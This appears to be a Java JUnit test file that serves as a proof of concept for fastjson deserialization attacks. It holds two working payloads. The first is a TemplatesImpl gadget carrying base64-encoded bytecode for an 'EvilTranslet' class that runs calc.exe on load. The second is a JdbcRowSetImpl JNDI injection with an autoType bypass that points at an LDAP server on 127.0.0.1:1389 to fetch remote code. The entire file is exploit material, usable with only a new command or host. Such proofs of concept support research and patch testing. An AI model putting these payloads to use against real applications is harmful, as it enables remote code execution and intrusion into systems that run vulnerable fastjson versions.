package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;

public class TestPayload {
    @Test
    public void test1(){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String test="{\"@type\":\"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\",\"_bytecodes\":[\"yv66vgAAADQAGQEADEV2aWxUcmFuc2xldAcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAoACwoACQAMAQAIY2FsYy5leGUIAA4BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAQABEKAAkAEgEABjxpbml0PgwAFAAGCgAEABUBAApTb3VyY2VGaWxlAQARRXZpbFRyYW5zbGV0LmphdmEAIQACAAQAAAAAAAIACAAFAAYAAQAHAAAAFgACAAAAAAAKuAANEg+2ABNXsQAAAAAAAQAUAAYAAQAHAAAAEQABAAEAAAAFKrcAFrEAAAAAAAEAFwAAAAIAGA==\"],\"_name\":\"EvilClass\",\"_tfactory\":{},\"_outputProperties\": {}}";
        JSON.parseObject(test, Object.class, Feature.SupportNonPublicField);
    }
    @Test
    public void test2(){
        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/poedpr\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }
}
